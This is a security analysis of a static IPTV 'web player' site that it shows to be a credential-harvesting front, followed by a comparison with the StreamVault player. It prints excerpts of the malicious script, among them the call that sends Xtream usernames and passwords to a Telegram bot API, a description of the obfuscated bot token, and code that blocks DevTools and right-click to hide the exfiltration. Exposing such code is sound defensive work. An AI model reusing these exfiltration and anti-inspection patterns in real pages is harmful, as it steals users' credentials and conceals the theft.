# xalbpro.eu.org — Security Analysis

**URL:** http://xalbpro.eu.org/ (HTTP only — HTTPS is a 1788-byte auto-redirect page with no real cert)
**Server:** OpenResty 1.29.2.3 (nginx fork)
**Branding:** "xALB Pro" / "xALB Web Player"
**Source size:** 107,508 bytes — single static HTML file, no build step, no backend

## TL;DR

**Credential-harvesting front disguised as a web player.** Every login exfiltrates the user's Xtream Codes username + password to a Telegram bot. The DevTools/right-click blocking is there to prevent users from noticing.

## How it works

1. User pastes a Xtream playlist URL into the page's URL hash (e.g. `http://xalbpro.eu.org/#http://server/playlist?user=X&pass=Y`)
2. Page reads the hash, calls the upstream Xtream API directly from the browser via `axios`
3. Fetches live channels, movies, series, categories in parallel
4. Plays streams in-browser using hls.js
5. **Sends the user's credentials to a Telegram bot every time they log in** (see below)

## The credential exfiltration

Lines 1685–1740 of the inline `<script>`:

```js
const user = p.get('username'), pass = p.get('password');
// ... fetch channels, series, movies from the Xtream panel ...
_tgSend(link, user, pass, S.allLive.length, S.allSeries.length, S.allMovies.length, api);
```

`_tgSend` (line 1735) POSTs to `https://api.telegram.org/bot<TOKEN>/sendMessage` with:

```
🔗 http://your-iptv-server/playlist?username=USER&password=PASS
👤 USER | 🔑 PASS
📺 1234 | 🎬 56 | 🎥 78
📌 VIP | WORLD CUP 2026 4K
📌 EU | FR | SPORTS
👑
```

The bot token and chat_id are obfuscated as two arrays of char codes and reassembled at runtime (lines 1743–1745). Pattern: `_tg.t` and `_tg.c` are arrays of ASCII codes; `_tok()` and `_cid()` convert them to strings on demand.

The payload also calls `get_live_categories` and looks for Albanian-language category names (Albania, shqiptare, kombetare, shqip, Fëmije, Lokale, Digitalb, Tring, Tibo, Lajme, AL) — strongly suggests the operator is Albanian-speaking and likely reselling/aggregating stolen subscriptions.

## Other hostile UX patterns

```js
// Line 1748-1753 — block DevTools
document.addEventListener('keydown', e => {
  if (e.key === 'F12' ||
      (e.ctrlKey && e.shiftKey && e.key === 'I') ||
      (e.ctrlKey && e.key === 'U')) e.preventDefault();
});

// Detect window dimension delta — if DevTools is open, redirect to blank
setInterval(() => {
  if (window.outerWidth - window.innerWidth > 160 ||
      window.outerHeight - window.innerHeight > 160)
    window.location.href = 'about:blank';
}, 1000);

// Disable right-click
document.addEventListener('contextmenu', e => e.preventDefault());
```

## Ad injection

Line 8 of the HTML loads an `EffectiveGate CPM` ad script (`pl25571630.effectivegatecpm.com/...`) in the page head. The operator is paid per impression; credential exfiltration is a secondary revenue stream.

## Mobile handling

```js
// Line 1605-1607
if (/Android/i.test(navigator.userAgent)) {
  window.location.href = 'vlc://' + url;
  setTimeout(() => _dlM3U(url, n), 2000);
}
else if (/iPhone|iPad/i.test(navigator.userAgent)) {
  window.location.href = 'vlc-x-callback://x-callback-url/stream?url=' + encodeURIComponent(url);
  setTimeout(() => _dlM3U(url, n), 2000);
}
```

Detects mobile and hands off to external VLC player via URL scheme.

## Tech stack

| Layer | Implementation |
|-------|----------------|
| Hosting | Static OpenResty/nginx. HTTPS serves a 1788-byte redirect page; HTTP serves the real app |
| Frontend | Vanilla JS, no framework, no build. ~3000 lines of inline script |
| Auth | Xtream API: `GET {panel}/player_api.php?username=X&password=Y` via axios |
| Player | hls.js from jsDelivr CDN. Detects TS vs HLS by stream extension |
| EPG | **Not implemented** |
| VOD/Series | All fetched on login, no pagination. Heavy first paint for large panels |
| State | Plain JS object `S = { api, origin, user, pass, mode, ... }` — manual re-renders |
| Design | "Cinema Dark" theme, cyan accent, scanline effects, animated tiles, toast notifications, glassmorphism. The visual craft is high. |
| Search | None; has a sport-channel filter on Live that matches keywords like 'nba', 'liga', 'premier' |

## Why you shouldn't use it

1. Your Xtream credentials are sent to a Telegram bot you don't own every login. The bot operator can resell them or stream on your tab.
2. Anyone you share a playlist URL with is also harvested (the URL contains the credentials in the hash, and the page exfiltrates them as soon as it loads).
3. The DevTools/right-click blocking exists to prevent users from noticing the exfiltration.
4. The ad script is the operator's primary monetization; credentials are a side hustle.

The operator can do this because they control the static page. **Any self-hosted or open-source player doesn't have this risk** — the source is your own repo, the connections stay in your control.

## Comparison with StreamVault

| | xALB Pro | StreamVault |
|---|----------|-------------|
| Source | Single obfuscated HTML | React + Vite project, all code in repo |
| Codebase | ~3000 lines inline | Multi-component modular architecture |
| Build | None — pure static | Vite production build, source maps, tree-shaking |
| Frameworks | None (vanilla JS) | React 18, hooks, context |
| State | Manual DOM updates | React state + IndexedDB caching |
| Connections | Xtream only | Xtream, Stalker, M3U, HLS, direct HLS, Plex, Jellyfin |
| EPG | None | XMLTV + Stalker EPG, timeline grid, live program info |
| Search | None | Full search across all sections |
| History/Favorites | None | Per-connection encrypted sync (auth) or local IDB (guest) |
| Multi-server | One per page-load (URL hash) | Multiple saved, switch in UI, encrypted with user-scoped AES-GCM |
| Validation | None | Per-click validate (Stalker `/stalker/validate`, Xtream `auth()`), confirm modal before switching to invalid connections |
| Security | Active credential exfiltration to Telegram bot; blocks F12/right-click; deceptive HTTPS | Per-user AES-GCM encryption of credentials, TLS via CF/VPS, no credential telemetry |
| Auth | None on the player site | Optional auth (Google/GitHub OAuth + guest mode) with `sv-connections` encrypted at rest |
| Offline / PWA | No | Service worker, manifest, installable PWA |
| Caching | None — refetches everything every load | IndexedDB cache for Stalker, Xtream, EPG, settings |
| Mobile | Redirects to external VLC | Native in-browser player with mobile-optimized UI |
| i18n | English only (Albanian audience) | 10 languages with i18n key system |
| Theming | Single "Cinema Dark" | Multiple user-selectable themes, CSS custom properties |
| Image proxy | Direct from upstream (browser→upstream) | All images via `/img` proxy with server-side cache |
| VAST ads | None | Optional client-side VAST pre-roll with click tracking |
| Telemetry | None declared | `trackAnalytics` for `portal_connect`, `connection_validate` — user-actionable events only |
| OSS / source | Closed; obfuscated; not inspectable | All code in this repo, with tests, build pipeline |

## Verdict

**Do not use.** Even for a quick test, the credentials are already gone. If you have any Xtream account that was used in this player, rotate the password on the panel immediately.

## References

- The static page itself: http://xalbpro.eu.org/
- An example Xtream panel that works with this player: http://vca.easy747.com/ (player_api.php + xmltv.php + get.php endpoints, Xtream Codes protocol)
- HTTP request analysis done on 2026-06-10
